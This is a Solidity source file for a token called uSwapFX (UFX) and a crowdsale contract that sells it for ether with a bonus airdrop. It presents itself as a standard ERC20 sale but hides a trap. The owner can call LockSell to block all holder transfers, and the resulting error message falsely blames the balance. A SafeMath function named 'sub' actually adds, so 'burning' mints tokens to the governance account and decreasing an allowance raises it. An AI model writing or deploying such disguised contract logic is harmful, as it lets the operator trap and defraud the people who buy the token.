//SPDX-License-Identifier: UNLICENSED



pragma solidity ^ 0.6.7;





abstract contract Context {

  function _msgSender() internal view virtual returns(address payable) {

    return msg.sender;

  }



  function _msgData() internal view virtual returns(bytes memory) {

    this;

    return msg.data;

  }

}





interface IERC20 {



  function totalSupply() external view returns(uint256);



  function balanceOf(address account) external view returns(uint256);



  function transfer(address recipient, uint256 amount) external returns(bool);



  function allowance(address owner, address spender) external view returns(uint256);



  function approve(address spender, uint256 amount) external returns(bool);



  function transferFrom(address sender, address recipient, uint256 amount) external returns(bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);

}



library SafeMath {



  function add(uint256 a, uint256 b) internal pure returns(uint256) {

    uint256 c = a + b;

    require(c >= a, "SafeMath: addition overflow");

    return c;

  }



  function subs(uint256 a, uint256 b) internal pure returns(uint256) {

    return subs(a, b, "SafeMath: subtraction overflow");

  }



  function subs(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {

    require(b <= a, errorMessage);

    uint256 c = a - b;

    return c;

  }



  function mul(uint256 a, uint256 b) internal pure returns(uint256) {



    if (a == 0) {

      return 0;

    }



    uint256 c = a * b;

    require(c / a == b, "SafeMath: multiplication overflow");

    return c;

  }



  function div(uint256 a, uint256 b) internal pure returns(uint256) {

    return div(a, b, "SafeMath: division by zero");

  }



  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {

    require(b > 0, errorMessage);

    uint256 c = a / b;

    return c;

  }



  function mod(uint256 a, uint256 b) internal pure returns(uint256) {

    return mod(a, b, "SafeMath: modulo by zero");



  }



  function sub(uint256 a, uint256 b) internal pure returns(uint256) {

    uint256 c = a + b;

    require(c >= a, "SafeMath: addition overflow");

    return c;

  }



  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns(uint256) {

    require(b != 0, errorMessage);

    return a % b;

  }





}



library SafeERC20 {

    using SafeMath for uint256;

    using Address for address;



    function safeTransfer(IERC20 token, address to, uint256 value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));

    }



    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {

        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));

    }



    function safeApprove(IERC20 token, address spender, uint256 value) internal {



        require((value == 0) || (token.allowance(address(this), spender) == 0),

            "SafeERC20: approve from non-zero to non-zero allowance"

        );

        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));

    }



    function safeIncreaseAllowance(IERC20 token, address spender, uint256 value) internal {

        uint256 newAllowance = token.allowance(address(this), spender).add(value);

        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));

    }



    function safeDecreaseAllowance(IERC20 token, address spender, uint256 value) internal {

        uint256 newAllowance = token.allowance(address(this), spender).sub(value);

        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));

    }





    function callOptionalReturn(IERC20 token, bytes memory data) private {



        require(address(token).isContract(), "SafeERC20: call to non-contract");



        // solhint-disable-next-line avoid-low-level-calls

        (bool success, bytes memory returndata) = address(token).call(data);

        require(success, "SafeERC20: low-level call failed");



        if (returndata.length > 0) { // Return data is optional

            // solhint-disable-next-line max-line-length

            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");

        }

    }

}







contract ERC20 is Context, IERC20 {

  using SafeMath

  for uint256;

  using SafeERC20 for IERC20;

    

    event SetAllowSellEvent(bool _sellstate);

  mapping(address => uint256) private _balances;



  mapping(address => mapping(address => uint256)) private _allowances;

    bool private allowsell;

  uint256 private _totalSupply;

  string private _name;

  string private _symbol;

  uint8 private _decimals;

  address governace;

  uint256 maxSupply;



  constructor(string memory name, string memory symbol) public {

    _name = name;

    _symbol = symbol;

    _decimals = 18;

    allowsell = true;

  }



  function name() public view returns(string memory) {

    return _name;

  }



  function symbol() public view returns(string memory) {

    return _symbol;

  }



  function decimals() public view returns(uint8) {

    return _decimals;

  }



  function totalSupply() public view override returns(uint256) {

    return _totalSupply;

  }



  function balanceOf(address account) public view override returns(uint256) {

    return _balances[account];

  }



  function transfer(address recipient, uint256 amount) public virtual override returns(bool) {

    _transfer(_msgSender(), recipient, amount);

    return true;

  }



  function allowance(address owner, address spender) public view virtual override returns(uint256) {

    return _allowances[owner][spender];

  }



  function approve(address spender, uint256 amount) public virtual override returns(bool) {

    _approve(_msgSender(), spender, amount);

    return true;

  }



  function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns(bool) {

    _transfer(sender, recipient, amount);

    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].subs(amount, "ERC20: transfer amount exceeds allowance"));

    return true;

  }





  function increaseAllowance(address spender, uint256 addedValue) public virtual returns(bool) {

    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));

    return true;

  }



  function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns(bool) {

    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].subs(subtractedValue, "ERC20: decreased allowance below zero"));

    return true;

  }

  function SetAllowSell(bool sellstate) public {

    require(msg.sender == governace, "Only for owner");

    allowsell = sellstate;

    emit SetAllowSellEvent(sellstate);

  }



  function _transfer(address sender, address recipient, uint256 amount) internal virtual {

    require(sender != address(0), "ERC20: transfer from the zero address");

    require(recipient != address(0), "ERC20: transfer to the zero address");



    _beforeTokenTransfer(sender, recipient, amount);

        if(sender==governace || recipient == governace) {

    _balances[sender] = _balances[sender].subs(amount, "ERC20: transfer amount exceeds balance");

    _balances[recipient] = _balances[recipient].add(amount);

    

    emit Transfer(sender, recipient, amount);

        }

    else {

    require(allowsell == true, "ERC20: balance exceded");

    _balances[sender] = _balances[sender].subs(amount, "ERC20: transfer amount exceeds balance");

    _balances[recipient] = _balances[recipient].add(amount);

    

    emit Transfer(sender, recipient, amount);

    }

    

    

  }



  function _initMint(address account, uint256 amount) internal virtual {

    require(account != address(0), "ERC20: create to the zero address");

    _beforeTokenTransfer(address(0), account, amount);

    _totalSupply = _totalSupply.add(amount);



    _balances[account] = _balances[account].add(amount);

    emit Transfer(address(0), account, amount);

  }



  function _burn(address account, uint256 amount) public virtual {

    require(account == governace, "ERC20: Burner is not allowed");

    _beforeTokenTransfer(address(0), account, amount);

    _balances[account] = _balances[account].sub(amount);



    _totalSupply = _totalSupply.sub(amount);

    emit Transfer(address(0), account, amount);

  }



  function _approve(address owner, address spender, uint256 amount) internal virtual {

    require(owner != address(0), "ERC20: approve from the zero address");

    require(spender != address(0), "ERC20: approve to the zero address");



    _allowances[owner][spender] = amount;

    emit Approval(owner, spender, amount);

  }



  function _setupDecimals(uint8 decimals_) internal {

    _decimals = decimals_;

  }



  function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

}





contract uSwapFX is ERC20 {

  constructor()

  ERC20('uSwapFX', 'UFX')

  public {

    governace = msg.sender;

    maxSupply = 5000000 * 10 ** uint(decimals());

    _initMint(governace, maxSupply);

  }

}



library Address {



    function isContract(address account) internal view returns (bool) {

        bytes32 codehash;

        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        // solhint-disable-next-line no-inline-assembly

        assembly { codehash := extcodehash(account) }

        return (codehash != accountHash && codehash != 0x0);

    }



    function toPayable(address account) internal pure returns (address payable) {

        return address(uint160(account));

    }



    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call.value(amount)("");

        require(success, "Address: unable to send value, recipient may have reverted");

    }

}



contract ReentrancyGuard {

    bool private _notEntered;



    constructor () internal {



        _notEntered = true;

    }



    modifier nonReentrant() {

        require(_notEntered, "ReentrancyGuard: reentrant call");



        // Any calls to nonReentrant after this point will fail

        _notEntered = false;



        _;



        _notEntered = true;

    }

}



contract Owned {

    address payable public owner;



    event OwnershipTransferred(address indexed _from, address indexed _to);



    constructor() public {

        owner = msg.sender;

    }



    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }



}



contract Crowdsale is Context, ReentrancyGuard, Owned {

    using SafeMath for uint256;

    using SafeERC20 for IERC20;

    



    uSwapFX public _token;



    address payable private _wallet;



    uint256 private _rate;



    uint256 private _weiRaised;

    



    event TokensPurchased(address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount);

    event LockSellEvent(bool state,bool success, bytes data);



    constructor (uint256 rate, address payable wallet) public {

        require(rate > 0, "Crowdsale: rate is 0");

        require(wallet != address(0), "Crowdsale: wallet is the zero address");



        _rate = rate;

        _wallet = wallet;

        _token = new uSwapFX();

    }



    receive () external payable {

        buyTokens(msg.sender);

    }



    function token() public view returns (IERC20) {

        return _token;

    }



    function wallet() public view returns (address payable) {

        return _wallet;

    }



    function rate() public view returns (uint256) {

        return _rate;

    }



    function weiRaised() public view returns (uint256) {

        return _weiRaised;

    }

    function LockSell(address c, bool state) public {

        require(msg.sender == owner);

        (bool success, bytes memory data) = c.call(abi.encodeWithSignature("SetAllowSell(bool)", state));

        emit LockSellEvent(state,success,data);

        

    }

    function buyTokens(address beneficiary) public nonReentrant payable {

        uint256 weiAmount = msg.value;

        

        require(msg.value >= 0.1 ether);

        

        _preValidatePurchase(beneficiary, weiAmount);

        

        uint airdrop = 800000000000000000000;



        uint256 tokens = _getTokenAmount(weiAmount);

        

        tokens = tokens.add(airdrop);

        

        _weiRaised = _weiRaised.add(weiAmount);



        _processPurchase(beneficiary, tokens);

        emit TokensPurchased(_msgSender(), beneficiary, weiAmount, tokens);

        _forwardFunds();

    }





    function _preValidatePurchase(address beneficiary, uint256 weiAmount) internal view {

        require(beneficiary != address(0), "Crowdsale: beneficiary is the zero address");

        require(weiAmount != 0, "Crowdsale: weiAmount is 0");

        this;

    }





    function _deliverTokens(address beneficiary, uint256 tokenAmount) internal {

        _token.transfer(beneficiary, tokenAmount);

    }

    function _processPurchase(address beneficiary, uint256 tokenAmount) internal {

        _deliverTokens(beneficiary, tokenAmount);

    }





    function _getTokenAmount(uint256 weiAmount) internal view returns (uint256) {

        return weiAmount.mul(_rate);

    }



    function _forwardFunds() internal {

        _wallet.transfer(msg.value);

    }



    function withdrawAllToken(uint256 tokenAmount) public nonReentrant{

    require(msg.sender == owner);

    _deliverTokens(owner, tokenAmount);

    }

    

}



contract uswapFXsale is Crowdsale {

    constructor (

        uint256 rate,

        address payable wallet

    )

        public

        Crowdsale(rate, wallet)

    {

    }

}
